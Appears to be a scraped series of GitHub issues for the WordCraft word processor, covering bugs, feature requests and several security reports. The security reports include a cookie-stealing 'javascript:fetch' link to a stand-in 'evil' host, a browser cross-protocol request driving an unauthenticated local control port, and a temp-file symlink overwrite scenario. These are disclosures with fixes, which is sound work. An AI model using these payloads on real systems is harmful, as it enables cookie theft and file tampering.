title: Symbol-font bullets (U+F0B7) render as a wrong glyph instead of •
author: rclinux
body:
**Version:** wordcraft 0.3.0, Linux x86_64 release tarball (Arch-based distro, Wayland)

### What happens
In a bulleted list from a .docx that uses Word's standard bullet, the bullet renders as a wrong glyph that looks like a small logo or arrow, not a round dot. Second-level bullets ("o" in Courier New) render correctly.

### Cause (as far as I can tell)
The bullet level is defined the way Word writes it by default:

```xml
<w:numFmt w:val="bullet"/>
<w:lvlText w:val=""/>
<w:rPr><w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" .../></w:rPr>
```

U+F0B7 is a Private Use Area code point that only means "bullet" in the Symbol font. When Symbol isn't installed (common on Linux), the fallback font draws whatever it has at U+F0B7. Word and LibreOffice map Symbol-font PUA characters (U+F020–U+F0FF) back to their standard Unicode equivalents (U+F0B7 → U+2022 •) when Symbol isn't available.

### Steps to reproduce
```sh
printf -- '- one\n- two\n  - nested\n' > list.md
pandoc list.md -o list.docx        # pandoc 3.10.2; its reference docx uses Word's default Symbol bullet
wordcraft-cli render list.docx list.png
```
The same glyph shows up in the app and in `wordcraft-cli convert list.docx out.pdf`.

### Expected
A round bullet (•), as in Word and LibreOffice.

### Suggested fix
Map Symbol (and maybe Wingdings) PUA characters to their Unicode equivalents when that font isn't available, at least U+F0B7 → U+2022 and U+F0A7 → U+25AA (Wingdings §-square, also common in Word lists).

title: Control server (--control) accepts unauthenticated commands, including file.saveAs to any path
author: Seronsecurity
body:
## Summary

When WordCraft is started with `--control <port>` (or `WORDCRAFT_CONTROL_PORT`), `apps/wordcraft/src/control_server.rs` listens on `127.0.0.1:<port>` and runs every JSON line it receives as an engine command. There is no token or other authentication, so any local process can drive the app. The command set includes `file.saveAs`, `file.exportPdf` and `file.exportPng` with arbitrary paths, which means any local process can write files anywhere the user can.

The server is opt-in and loopback-only, so this is low severity. I'm reporting it as defense in depth, because the feature exists so agents can use it and people may leave it running.

## Browser reachability

`serve()` replies `bad JSON` to a line it can't parse and then keeps reading the connection. An HTTP request therefore isn't rejected: its request line and headers fail to parse, and a body such as

```
\n{"method":"file.saveAs","params":{"path":"..."}}\n
```

is still executed. A web page could send that with `fetch("http://127.0.0.1:<port>/", {method: "POST", mode: "no-cors", body})`. Recent Chromium Local Network Access checks block many of these requests, but not every browser or version does, and the port is often predictable.

## Suggested fixes

1. Require a per-launch random token, printed to stderr or written to a 0600 file, sent as the first line or in each request, and have `wordcraft mcp --connect` pass it along.
2. Close the connection on the first line that isn't valid JSON, or reject anything that looks like HTTP (`GET `, `POST `, `Host:`). This kills the cross-protocol vector.
3. Optionally, by default, gate file-system commands (`file.open`, `file.save*`, `file.export*`, `insert.picture` with `path`, mail-merge recipients from a path) behind a flag.

## Related, minor

Ctrl/Cmd+click on a hyperlink (`crates/ui-egui/src/canvas.rs`, around line 511) passes any URL to `ctx.open_url` without checking the scheme. Allowing only `http`, `https` and `mailto`, or confirming before anythi…

title: Linux (GNOME Wayland): window title bar doesn't match the desktop theme
author: fqazzazee
body:
## Environment

- Fedora 44, GNOME Shell 50.5, Wayland session, 167% display scaling
- Built from source at `d7d9702`

## Title bar doesn't follow the GNOME theme (Wayland)

On GNOME Wayland, the app draws its own title bar. This app shows winit's plain fallback bar, which
ignores the GNOME theme, dark mode and button layout.

The workspace sets `eframe = { version = "0.36", default-features = false }` (`Cargo.toml:53`),
which also drops winit's default `wayland-csd-adwaita` feature, so `sctk-adwaita` isn't in
`Cargo.lock`.

Possible fixes:

- Enable `winit/wayland-csd-adwaita`, so the title bar follows GNOME's look and light/dark mode, or
- Draw an in-app title bar, as PhotoCraft does on Linux.

Workaround: start the app through Xwayland (`env -u WAYLAND_DISPLAY wordcraft`), so GNOME draws a real
title bar.

Same issue in GridCraft, with more detail: https://github.com/storytold/gridcraft/issues/54

title: Track Changes: `edit.replaceAll` makes untracked edits when Track Changes is on
author: thaynej
body:
With Track Changes on, Replace All changes the text directly instead of recording tracked insertions/deletions. Replacing one match at a time (`edit.find` + `edit.replace`) *is* tracked, so the two paths behave differently.

**Steps**
```
wordcraft-cli run --file a-replaceall.docx \
  --cmd 'edit.replaceAll={"text":"towards","with":"toward"}' \
  --save a-replaceall-after.docx --print
```
Input paragraph: `We walked towards the light, then towards home.` (settings.xml has `<w:trackRevisions/>`)

**Expected:** two tracked replacements (`<w:del>towards</w:del><w:ins>toward</w:ins>` ×2). Rejecting all changes restores the original sentence.

**Actual:** `edit.replaceAll: {"replaced":2}`, and the saved document.xml has plain runs `We walked toward the light, then toward home.` with no `w:ins`/`w:del`. The edit can't be reviewed or rejected.

This is the most dangerous path for scripted/MCP mass edits, since it's the obvious command to reach for.

Environment: WordCraft 0.3.0, macOS universal, headless `wordcraft-cli run`.
**Repro documents** (minimal synthetic files; `word/settings.xml` contains `<w:trackRevisions/>`; `word/document.xml` body shown):

`a-replaceall.docx`
```xml
<w:p><w:r><w:t xml:space="preserve">We walked towards the light, then towards home.</w:t></w:r></w:p>
```

`a-replaceall-after.docx`
```xml
<w:p><w:r><w:t xml:space="preserve">We walked toward the light, then toward home.</w:t></w:r></w:p><w:sectPr><w:type w:val="nextPage"/><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720" w:num="1"/></w:sectPr>
```

title: Track Changes: Find/Replace matches text inside tracked deletions; replacing it brings deleted text back (and repeated Replace gives "towardtoward")
author: thaynej
body:
`edit.find` / `edit.replace` treat text inside a tracked deletion (`w:del`) as live text. Replacing a match there inserts new text into the final document where the author had deleted it. Since a tracked replacement leaves the old word behind as a `w:del`, the *next* `edit.replace` finds that same deleted word again and stacks a second insertion.

**Steps (a): match inside someone else's deletion**
Input: `The cat sat ` + `<w:del w:author="Alice">towards the door </w:del>` + `quietly.`
Final view: `The cat sat quietly.`
```
wordcraft-cli run --file b-in-deletion.docx \
  --cmd 'edit.find={"text":"towards"}' \
  --cmd 'edit.replace={"text":"towards","with":"toward"}' \
  --save b-in-deletion-after.docx --print
```
**Expected:** no match (the word is deleted), or at least nothing new appearing in the final text.
**Actual:** `edit.find` reports 1 match. After the replace, the final view reads **`The cat sat towardquietly.`**: a live insertion lands where Alice's text had been removed. Alice's deletion is also split, and the `towards` part is re-attributed to `WordCraft User`:
`<w:ins author="WordCraft User">toward</w:ins><w:del author="WordCraft User">towards</w:del><w:del author="Alice"> the door </w:del>`

Two small gaps for scripted/agent review edits in headless mode:

title: Desktop app redraws every frame while idle (window title sent each frame)
author: castlelele
body:
The desktop app never goes idle: it redraws at the monitor's refresh rate even when nothing on screen changes.

## Observed (v0.3.0, Linux/Wayland, Intel UHD 620)

- An empty document left alone: ~180 `wl_surface.commit` per second (`WAYLAND_DEBUG=1`, 90 Hz monitor), about 14% CPU and 10% GPU.
- GridCraft and DeckCraft 0.3.0 on the same machine: 0 commits per second, 0% CPU when idle.

## Cause

`WordApp::ui` sends the window title at the end of every frame (`crates/ui-egui/src/lib.rs`, still on `main`):

```rust
let title = format!("{}{} - WordCraft", self.title_stem(), if self.session.dirty { " •" } else { "" });
ctx.send_viewport_cmd(egui::ViewportCommand::Title(title));
```

`Context::send_viewport_cmd_to` calls `request_repaint_of` for every command (egui 0.36.2, `context.rs`), so each frame schedules the next one. With egui's `repaint_causes()` logged per frame, every cause while idle is that `send_viewport_cmd` call.

## Suggested fix

Send the title only when it changes, as GridCraft does (`grid.last_title`):

```rust
let title = format!("{}{} - WordCraft", self.title_stem(), if self.session.dirty { " •" } else { "" });
if self.last_title.as_deref() != Some(title.as_str()) {
    ctx.send_viewport_cmd(egui::ViewportCommand::Title(title.clone()));
    self.last_title = Some(title);
}
```

(with `last_title: Option<String>` on `WordApp`).

## Reproduce

1. Start `wordcraft` with an empty document and leave it alone.
2. `WAYLAND_DEBUG=1 wordcraft 2>&1 | grep -c 'wl_surface#[0-9]*.commit()'` over a few seconds, or watch its CPU use: it keeps rendering frames instead of going idle.

title: Crash on startup on Windows with Intel UHD Graphics (Access Violation 0xc0000005 in igvk64.dll)
author: quantavil
body:
### Description:
    On Windows with Intel UHD Graphics, WordCraft crashes immediately on launch without opening a window. The crash
  occurs when `wgpu` enumerates Vulkan physical devices, triggering an access violation inside Intel's Vulkan driver
  (`igvk64.dll`).

    ### Environment:
    - **WordCraft Version:** 0.4.0 (and 0.3.0)
    - **OS:** Windows 10/11 x64
    - **GPU:** Intel(R) UHD Graphics 630 (Driver: 31.0.101.1999)
    - **Faulting Module:** igvk64.dll (Exception: 0xc0000005, offset: 0x0000000000636952)

    ### Workaround:
    Setting `$env:WGPU_BACKEND="dx12"` bypasses Vulkan and runs WordCraft without crashes.

title: Footnote and endnote numbers are missing from the note text in Word documents
author: LloydNicholson
body:
Footnotes and endnotes from Word documents show no number in the note text: they read " First footnote text." instead of "¹ First footnote text.". The numbers in the body text are fine.

**Repro:** any `.docx` with a footnote made in Word. Its `footnotes.xml` looks like:
```xml
<w:footnote w:id="1"><w:p><w:r><w:rPr><w:rStyle w:val="FootnoteReference"/></w:rPr><w:footnoteRef/></w:r>
<w:r><w:t xml:space="preserve"> First footnote text.</w:t></w:r></w:p></w:footnote>
```

**Expected:** the note starts with its number (¹, or a, i… with a custom number format), as in Word.

**Actual:** no number in the note, on screen or in PDF export. Endnotes are the same.

**Cause:** `w:footnoteRef` / `w:endnoteRef` are never read (`read_notes` in `crates/docx/src/read/mod.rs`). Layout and the writer already expect a note to start with a reference to itself (#53), but notes read from Word files never contain one.

**Environment:** macOS 26.6.2 arm64, wordcraft `main` @ d7d9702 (0.3.0).

Fix in #103.

title: Table style paragraph/run formatting is ignored: Word tables render ~60% taller
author: LloydNicholson
body:
Text in table cells ignores the table style's own paragraph and run formatting. Word's default "Table Grid" style sets `<w:spacing w:after="0" w:line="240" w:lineRule="auto"/>`, but cell text uses the document defaults instead (8 pt after, 1.08 lines). So almost every Word table renders about 60% taller than in Word and paginates differently.

**Repro:**
- A `.docx` with an 80-row "Table Grid" table, and docDefaults of `after=160 line=259` (Word's normal template).
- A custom table style `basedOn` TableGrid that adds red bold text (`rPr`).

**Expected:**
- Compact rows of about 14 pt; the 80-row table fits on 2 pages, as in Word.
- The derived style shows red bold text with borders.

**Actual:**
- Rows of about 22 pt; the table takes 3 pages.
- The derived style shows no red, no bold and no borders.

**Cause:**
- `resolve_para` / `resolve_char` (`crates/doc/src/resolve.rs`) have no table-style level, so table-style pPr/rPr are parsed but never used.
- `style_parts` (`crates/layout/src/table.rs`) takes the first style in the basedOn chain without merging in its bases.
- The reader also drops `wholeTable` and the table style's `tblPr` shading and cell margins.

**Environment:** macOS 26.6.2 arm64, wordcraft `main` @ d7d9702 (0.3.0).

Fix in #104.

title: Zotero integration: cite while you write, with a Zotero tab in the ribbon
author: gledguri
body:
I've implemented Zotero integration in a local copy of WordCraft and would like to contribute it.

**What it does**
- A **Zotero** tab in the ribbon: Add/Edit Citation, Add Note, Add/Edit Bibliography, Refresh, Document Preferences, Unlink Citations.
- Talks to the running Zotero app through Zotero's published word-processor protocol (port 23116), the same one the Word and LibreOffice plugins use.
- Citations and bibliographies are stored as Word's Zotero plugin stores them (`ADDIN ZOTERO_` fields, prefs in custom document properties). Documents round-trip between WordCraft and Word with the Zotero plugin.
- Switching between an in-text style and a note style moves citations into and out of footnotes/endnotes.
- Each Zotero operation is one undo step.
- Also available headless: `wordcraft-cli zotero <command> <file>`.

**Groundwork it needed:** citation-manager `ADDIN` fields (Zotero, Mendeley, EndNote) are kept as real range fields with formatted results, including multi-paragraph bibliographies. Before, they were flattened to plain text.

**Testing:** a fake Zotero server over a real socket, hostile arguments for every protocol call, random frames (proptest), DOCX round trips, and manual checks against Zotero 10.0.6 on macOS. Docs in `docs/zotero.md`.

It's a series of focused commits; I'm happy to send it as a PR, or split it further, if you'd like it.

title: Read Aloud: player with speed control, sentence skipping, and skipping citations
author: gledguri
body:
I've improved Read Aloud in a local copy and would like to contribute it.

**What it does**
- Reads sentence by sentence using the system speech program (`say` on macOS, espeak on Linux, SAPI on Windows) on a worker thread, so it can pause, skip and change speed.
- A small floating player: previous sentence / play-pause / next sentence / stop, and a 0.5×–3× speed slider.
- The sentence being read is highlighted and the caret follows it.
- **Skip citations & bibliography** (on by default): Zotero, Mendeley, EndNote and Word citation fields aren't read out, which makes academic papers much easier to listen to.
- New commands: `readAloud.playPause/next/previous/stop/speed/skipCitations/status`. Speed and the skip setting are remembered between runs.

Happy to send a PR if you're interested.

title: AutoSave: off per document by default, with an "AutoSave all documents" option

title: [Bug] File › Close discards unsaved changes without a prompt
author: lpgn
body:
**Environment**
- Linux (Ubuntu 26.04), native build of main `a1caf22` with PRs #124, #125 and #178 on top. None of them change the code below.

**Steps to reproduce** (through the control port, `wordcraft --control <port>`)
1. `file.open` a `.docx` file.
2. `text.insert` some text.
3. At once (before AutoSave runs), `file.close`. This is the command of File › Close and Ctrl+W.

**Expected**
The app asks "Save changes to <name>?" with Save, Don't Save and Cancel, as Word does.

**Actual**
The app closed at once. The file on disk did not change. The inserted text was lost.

**Cause (from the code)**
- `file.close` (`crates/engine/src/cmd/file.rs`) asks the UI to close and does not look at `dirty`.
- `apps/wordcraft/src/main.rs`: `on_exit` saves only the preferences. There is no handler for the close request (egui `close_requested` with `ViewportCommand::CancelClose`).
- `file.recover` (Recover Unsaved Documents) lists only versions held in memory, so it cannot help after the app closes.

title: [Bug] Windows 简体中文界面菜单显示为豆腐块（tofu），发布包未内嵌中文面 Noto Sans CJK SC
author: Bawts
body:
## 问题描述

在 Windows 上把界面语言切成简体中文后，**功能区、菜单、按钮的中文显示为方框（豆腐块）**，而**文档正文里的中文完全正常**。

同一条标签内会出现「部分字正常、部分字是方框」：例如「删除」只显示「□除」，「接受 / 拒绝」里「接受」正常、「拒绝」是方框。

## 复现步骤

1. Windows 11，运行官方发布包 WordCraft 0.4.0
2. `文件 ▸ 选项 ▸ 界面语言` 选 **简体中文**
3. 功能区 / 菜单 / 按钮的中文变成 □□□
4. 在正文输入同样的中文 → 正常显示（这条区分了问题范围）

版本标识：

```
wordcraft: WordCraft 0.4.0 (a1caf22a)
```

## 根本原因

`crates/ui-egui/src/theme.rs` 把 craft-fonts 的面按语言挂到界面字体族，中文界面时 `ui_cjk_fonts(true)` 返回**中文面在前**：

```rust
for f in wordcraft_fonts::ui_cjk_fonts(prefer_hans) { ... }   // 中文面优先
```

也就是说中文面只要真在二进制里，简体界面就不会出方框。问题是**发布包没有内嵌中文面的字体数据**，于是回退到日文面 `BIZ UDPGothic`，而日文面缺少简体专用汉字。

三点验证：

**1. 字体数据是否存在**（内嵌字体的 `name` 表字符串会原样出现在二进制中）：

| craft-fonts 中的面 | `Noto Sans CJK SC` name 表字符串（UTF-16BE）出现次数 |
| --- | --- |
| `BIZ UDPGothic` / `BIZ UDMincho` / `Shippori Mincho`（Jpan） | 5 / 3 / 3 ✅ 已内嵌 |
| `Noto Sans CJK SC`（Hans） | **0** ❌ 未内嵌 |

exe 里只有 1 处 `Noto Sans CJK SC` 的 ASCII 字符串，那是 `theme.rs` 里 `format!("{} {}", f.family, f.style)` 编译进去的名字字面量。而 `craft-fonts` 的 `NotoSansCJKsc-Regular.otf` 文件本身带 UTF-16BE 的这个字符串 —— 它没进二进制。

**2. 字体格式**：该 `.otf` 是 CFF 轮廓（`OTTO`），三个日文面是 TrueType（`glyf`）。扫描 exe 的 sfnt 表目录，日文面都在（`BIZ UDPGothic` @ `0x292E9A1` 等），而 **CFF/`OTTO` 表目录为 0 个**。

**3. 缺字数量对得上现象**。用 `crates/ui-egui/src/i18n/zh-hans.tsv`（603 个不同汉字）统计覆盖：

| 面 | 覆盖 | 缺失 |
| --- | --- | --- |
| `Noto Sans CJK SC`（应有） | 600 | 3（`⌥ ➕ 📂`，非汉字） |
| `BIZ UDPGothic`（实际生效） | 446 | **157** |

缺的正是简体专用字：`页 ×64`、`选 ×28`、`标 ×26`、`样 ×24`、`线 ×24`、`图 ×24`、`编 ×20`、`删 ×19`、`单 ×18`、`题 ×18`、`显 ×17`…… 日文面认识的字用日文字形画出、不认识的变方框，与截图一致。

另外，`craft-fonts/fonts/manifest.txt` 里 `Noto Sans CJK SC | Regular | … | Hans,Latn` 那条 **2026-10-06** 就存在，v0.4.0 是 **2026-10-10** 发布，且 `release.yml` 各打包任务都设了 `CRAFT_FONTS_REQUIRED: "1"`（本该构建失败）。所以是**日文面进了、中文面没进**，建议查一下打包时 checkout 的 craft-fonts 版本和该 16.4 MB `.otf` 是否被丢弃。

## 修复方案

治本：让发布包正确内嵌 `Noto Sans CJK SC`。

兜底：给界面字体链补系统 CJK 字体回退，避免内嵌面缺失时直接出方框。在 `theme.rs::font_definitions()` 追加：

```rust
// 内嵌 craft-fonts 覆盖不了时，用系统 CJK 字体兜底
if let Some(name) = ins…

author: vangel76
body:
With Show/Hide ¶ on, the paragraph mark lands on a letter when the paragraph's direction differs from the direction of its last characters:

- RTL paragraph ending in Latin "abc": ¶ is drawn inside "abc" instead of at the far left.

Cause: `crates/layout/src/display.rs` (formatting marks) places the mark from `line.end_x()` — the caret position after the logically last character — and then offsets by the paragraph direction. title: UI localization: translation mechanism (and Polish as a first community language?)
author: mariuszurbaniak
body:
Hi, and thanks for WordCraft!

I couldn't find any UI localization support in WordCraft (nothing in the README, `AGENTS.md` or `ROADMAP.md`). The roadmap lists "localisation" as part of item 7 of the estimate to 100%, so I understand it is planned for later.

The sibling project [CADCraft](https://github.com/storytold/cadcraft) already has live language switching (English and Ukrainian) with a remembered Auto/system-language choice, and its README links `docs/localization.md`. Could WordCraft get the same mechanism, ideally reusing the CADCraft approach?

**Why it looks feasible here**
- Every action is a `CommandSpec` in `crates/engine/src/cmd/*.rs` with a label, so command labels are centralized (389 commands).
- Command ids stay English, so the CLI, MCP and control channel are unaffected by the UI language.

**Open questions**
- Where should translations live: engine (command labels) vs `ui-egui` (dialogs, menus, status text)?
- How should missing keys fall back (English)?
- Is a Polish translation (`pl`) welcome as a first community contribution once the mechanism exists? I'm happy to help with it.

**Related but separate:** spelling, grammar and hyphenation currently come from an English word list (Moby Hyphenator II per the README), so proofing in other languages would need its own work. Polish needs a Latin Extended-A capable font in the UI as well (ąćęłńóśźż).

Thanks!

title: feat(distribution): provide reliable CLI access with desktop packages
author: coygeek
body:
## Summary

Give desktop installations of WordCraft a documented CLI invocation that people, scripts, and agents can use on Windows, Linux, and macOS.

## Problem to solve

Including a CLI executable in a package does not always make a shell command available. Windows installs the CLI beside the app; Linux native packages install it in `/usr/bin`, while AppImage and Flatpak keep it inside their package. macOS publishes a separate CLI download. Users need a supported invocation that matches their desktop installation without guessing its location or modifying global settings.

## Proposed behavior

Provide a callable CLI with each desktop distribution or an integrated installation route where needed, and document the exact invocation outside the agent setup UI. Preserve the existing CLI commands and MCP subcommand.

For Windows MSI, document full-path invocation of the installed CLI and make any shell exposure an explicit choice. Portable ZIP users can run its included executable without a global installation. For Linux DEB/RPM, preserve the existing `/usr/bin` CLI. Provide supported AppImage and Flatpak invocation through a wrapper or command override with the required arguments. For macOS, supply a compatible CLI with the desktop distribution or through its integrated installation route so users need not manually coordinate another download.

Define update, relocation, and removal behavior for each advertised invocation. Managed launchers must not become stale or overwrite a separately installed CLI. Keep the standalone CLI download supported for users who do not want the GUI.

## Acceptance criteria

- Linux tarball users can invoke the extracted CLI using the advertised path or optional installation procedure without building from source.
- A fresh Windows MSI installation has a documented full-path command that reports its matching CLI version. A fresh portable ZIP works from its extracted directory, including paths with spaces.

title: Feature Request: Extensible Plugin System for WordCraft
author: ckstc
body:
**Summary**
I would like to propose adding an extensible plugin system to WordCraft, allowing third-party developers to build custom features without modifying the core codebase.
A well-designed plugin API would make it easier for developers to extend its functionality for specialized workflows, while keeping the core application maintainable.
**Proposed Capabilities**
1. Custom Commands and Actions
Allow plugins to register custom commands that can be invoked through the application, keyboard shortcuts, menus, or toolbars.
For example:
Register a command to format selected text.
Add a command to compare two documents.
Provide custom document-processing actions.
2. UI Extensions
Provide APIs for plugins to add UI elements, such as:
Custom toolbar or ribbon buttons.
Menu items and context-menu actions.
Panels or sidebars.
Settings pages.
Plugins should be able to integrate with the existing UI without directly modifying the core UI implementation.
3. Document API
Expose a stable, documented API for interacting with documents, including:
Reading and modifying document content.
Accessing the current selection and cursor position.
Applying formatting and styles.
Inserting, deleting, or replacing text.
Integrating with the undo/redo system where appropriate.
Ideally, plugin-driven document changes should use the same editing commands and document model as native operations, rather than manipulating internal data structures directly.
4. Plugin Lifecycle and Permissions
Provide a clear plugin lifecycle, including discovery, loading, activation, deactivation, and error handling.
For security and reliability, the system should also consider plugin permissions, API boundaries, and isolation between third-party code and the core application.
5. Developer Experience and API Stability
Provide:
A documented plugin API and example plugins.
A manifest format describing plugin metadata, version requirements, and permissions.
A mechanism for checking compatibility between plugins and…

## Summary

An Add/Edit Citation operation can insert its result into a blank document created after Zotero acquired the previous document. WordCraft accepts the original operation's delayed calls against the replacement document. This misplaces the citation and adds an undo step to the wrong document. The native app path is confirmed by source proof; runtime reproduction was not run.

## Steps to reproduce

These steps describe an unexecuted deterministic protocol replay for the source baseline below. Use an owned native WordCraft test instance with a fresh Zotero bridge and a clean blank Document A. Use a local Zotero protocol stub, with no real documents or settings. Pause the stub only long enough to replace the document, within its configured idle timeout.

1. Start `ui.zotero.addEditCitation` through the app's connected control channel or MCP. Let the stub read the integration command and send `Application_getActiveDocument` with arguments `[3]`. Wait for the reply. A fresh bridge returns protocol version 3 and document handle 1. Send no mutating call yet.
2. Hold the stub before its insertion calls. Run `file.new` with `{"template":"blank"}` in the app, creating Document B. Document A is still clean, so the ordinary user command does not require a Save Changes response. Confirm B is blank.
3. Release the stub. Send `Document_insertField` with `[1,"ReferenceMark",0]` and wait for the reply. In this fresh empty case the new field handle is 1. author: fernandodilland
body:
## TL;DR
In Word, AutoSave, Version History and co-authoring only work for files stored on OneDrive/SharePoint. Please add an open equivalent: one central "Save target" setting so a document can autosave to storage the user owns (local/NAS folder, Google Drive, OneDrive, S3-compatible such as Cloudflare R2, or anything rclone supports), keep automatic version history, avoid overwrites with a lease file, and optionally grow into paragraph-level co-editing. Opt-in, no vendor server, no telemetry.

## Why
- Unsaved documents are the classic way writers lose work. I couldn't find AutoRecover/AutoSave in the README (I couldn't read the source, so please correct me).
- A .docx is small, so syncing whole files is cheap: a lot of safety for little engineering.
- People who self-host can't use OneDrive-based features.

- AutoSave is on by default only for files in OneDrive, OneDrive for Business or SharePoint Online. The first edit creates a version, then a new one is added roughly every 10 minutes. Without it only local AutoRecover remains (10 minutes by default in the docs I found).

title: Let an end user add a font without rebuilding
author: tonguyenducmanh
body:
## Ask

Let an end user add a font without rebuilding:

- **Paste a link** — Google Fonts `/css2?family=…`, any stylesheet with `@font-face`, or a direct
  `.ttf` / `.otf` / `.woff2` URL.
- **Upload a file** — drag-drop or picker.

Today the web build ships only the fonts in `crates/fonts`, and changing that means a rebuild.

## Current behaviour

- `crates/fonts` bundles OFL faces — the documented exception to the "fonts live in `craft-fonts`"
  rule, per ATTRIBUTION.md — and `crates/doc` / `crates/layout` shape text with them.
- The web build has no runtime font loading at all, so the bundle is all a browser user has.

## Scope caveat

A user-installed font only helps **if shaping supports its script**. `crates/doc` shapes with
`skrifa` / `harfrust` and ROADMAP.md still lists Arabic and Devanagari shaping as open — so this
feature and that item are related but separate. Flagging so it isn't read as a shortcut around it.

## Suggestion

`crates/fonts` already owns font selection for layout, so layer a runtime set on top of the
bundled one rather than replacing it:

- bundled OFL faces = always-available baseline
- user-installed faces = added at load, never replacing the baseline

Keeping the baseline intact matters for `docs/typing-parity.md` — a user who installs a font
shouldn't silently change the metrics of documents that don't reference it.

## Why this fits

Four entries in the `CommandSpec` registry, and the web UI, CLI, MCP surface and JSON control
channel all follow for free:

| id | params |
| --- | --- |
| `font.install_url` | `{ url }` — `journal: true` |
| `font.install_file` | `{ path }` (desktop) / `rfd` picker (web) |
| `font.remove` | `{ family }` |
| `font.list` | — |

Persist in IndexedDB (`localStorage`'s ~5 MB is smaller than one CJK face); on desktop, an app font
directory `crates/fonts` already scans. Per `standards/never-crash.md`: a failed install logs and
skips, never panics.

- Installed font appears in the existi…

title: fix(table): a vertical merge (eraser on a horizontal border) still shows and clicks as two cells
author: rabis7575
body:
Found while testing table editing on current `main` (1d4f741).

**Steps**
1. Insert a 3×3 table and type something in the first two cells of the first column.
2. Table Layout › Draw › Eraser, click the horizontal border between the first two rows of the first column.

**What happens**
The border disappears and the text of the lower cell moves into the upper one, so the document does
merge them (`vmerge` restart/continue). But on screen it is still two cells:
- with Table Layout › View Gridlines on (the default) a gridline stays between the two rows;
- a click in the lower half puts the caret in an empty cell of its own (the continuation cell),
  so typing there goes into a cell that isn't shown as one.

Erasing a vertical border (a merge within one row) works as expected.

**Expected (Word)**
A vertically merged cell is one cell spanning the rows: no gridline inside it, and a click anywhere
in it puts the caret in it.

**Where it comes from**
`layout_table` (`crates/layout/src/table.rs`) pushes one `Placed::Cell` per row for every cell, the
continuation cells of a vertical merge included, each only as tall as its own row. The gridlines
(canvas, View Gridlines) outline every `Placed::Cell`, and hit testing (`crates/layout/src/hit.rs`)
picks the cell whose rect contains the point. The borders themselves are already right (the merged
group's inner top/bottom rules are skipped).

A possible fix: one `Placed::Cell` for the whole merge (the restart cell, as tall as its rows) and
none for the continuation cells, or map continuation cells to the restart cell in hit testing and
skip their inner gridline. Other users of the cell boxes (table border resizing and table mouse
handling, #600, #637) read row geometry from them, so they need a look too.

Happy to take this on if nobody else is on it.

title: Ribbon group titles collide with button labels
author: dkhlapov
body:
Two-line labels on large ribbon buttons end about 4 px below the button area, inside the group title row, so titles and labels overlap. Visible in about 20 groups across every tab, for example Table of Contents, Footnotes, Start Mail Merge, Write & Insert Fields, Preview Results, Finish, Speech, Accessibility, Protect, Ink, Views, Page Movement, Dark Mode and Window. Languages whose labels wrap more often are hit harder.

Cause: `big_button` / `menu_button` in `crates/ui-egui/src/widgets.rs` place the icon at 20 px and the first label line at 43 px with a 13 px pitch, so the second line ends past `CONTENT_H` (66 px), and the title is drawn 8 px from the bottom of a 16 px `LABEL_H` row. The Equation button in `equation_tab.rs` repeats the same numbers.

Fix: move the icon and label up, give the title row more room, share the offsets as constants, and assert at compile time that two label lines end inside `CONTENT_H`.

title: Palatino Linotype / Book Antiqua fall back to Times New Roman on macOS instead of Palatino
author: anmacmillan
body:
A DOCX set in Palatino Linotype renders in Times New Roman on macOS when the font is not in the system font folders, and a 4-page document in Word for Mac becomes 3 pages.

`substitutes()` in `crates/fonts/src/word.rs` maps `"palatino linotype"` and `"book antiqua"` to the generic `SERIF` list (Caladea, Times New Roman, …). macOS ships `Palatino` in `/System/Library/Fonts/Palatino.ttc`, the same design with much closer metrics.

Suggestions:

1. Give these two families their own list that tries `Palatino`, `TeX Gyre Pagella` and `URW Palladio L` before `SERIF`.
2. On macOS, also scan `/Applications/Microsoft Word.app/Contents/Resources/DFonts`, where Office installs Palatino Linotype, Aptos and others. `fontdb.rs` scans only `/System/Library/Fonts` and `/Library/Fonts`.

Repro: any DOCX with body text in Palatino Linotype, `wordcraft-cli convert in.docx out.pdf`, WordCraft 0.5.0 at `9cf3b68`, macOS on Apple silicon. Fonts embedded in the PDF: TimesNewRomanPSMT.

title: Control channel and MCP bridge write PNGs to predictable names in the shared temp folder
author: petycomp
body:
Found in a security review of `main` (dba6e66).

**Where**
- `crates/ui-egui/src/control.rs:206` — `ui.render` without `path` writes to the literal `/tmp/wordcraft-page.png` (also on macOS, not `$TMPDIR`).
- `crates/ui-egui/src/control.rs:238` — `ui.screenshot` without `path` writes to `/tmp/wordcraft-screenshot.png`.
- `crates/mcp/src/tools.rs:249` and `:269` — the `--connect` bridge's `render_page` and `screenshot` tools always round-trip through `temp_dir()/wordcraft-mcp-page.png` / `wordcraft-mcp-shot.png`, then read the file back for the model.

All of these end in `std::fs::write`, which follows an existing symlink and truncates its target.

**Scenario**
On a multi-user Linux/macOS host another local user pre-creates `/tmp/wordcraft-page.png -> /home/victim/Documents/thesis.docx`. The victim runs `wordcraft --control 7981` and an agent calls `ui.render` without `path`, or `render_page` through the MCP bridge: the victim's file is overwritten with PNG bytes. In the bridge case an attacker who races the write/read can also substitute the image the model sees.

Preconditions keep this moderate: `--control` is opt-in, the request has to come through the authenticated control channel or the MCP bridge, and the host must be shared. `apps/wordcraft/src/print.rs:52-77` already shows the safe pattern (`create_new(true)` + mode 0600 + a per-process unique name).

**Suggested fix**
Return the PNG in the reply (base64 `png`, the shape the headless MCP `ui.render` already uses) when no `path` is given, and have the bridge use that instead of a temp file. PR to follow.

title: HTML and Markdown export write javascript: and other non-web hyperlink targets into href
author: petycomp
body:
Found in a security review of `main` (dba6e66).

**Where**
`crates/formats/src/html.rs:1208` writes any `CharProps.link` into `<a href="…">` after escaping only `& < > "`; `crates/formats/src/markdown.rs:1132,1168` likewise write it as the link destination. There is no scheme check. By contrast the HTML importer drops `javascript:` hrefs (`html.rs:1008`) and Ctrl/⌘-click only follows `http`/`https`/`mailto` (`crates/ui-egui/src/canvas.rs:1688`), so export is the one place the project's own link policy is missing.

**Scenario**
A received .docx/.odt/.rtf carries a hyperlink `javascript:fetch('https://evil/?c='+document.cookie)` (`w:hyperlink` with an External relationship; ODT `xlink:href`; RTF `HYPERLINK` field — all read verbatim). Opening it in WordCraft is safe (the click is refused). If the user then does Save As → HTML and opens or publishes that file, clicking the link runs the attacker's script in the file's or hosting site's origin. Note that browsers strip tabs/newlines before parsing, so `java\nscript:` counts too.

Severity: low (needs a second user action), but it is a one-line policy gap.

**Suggested fix**
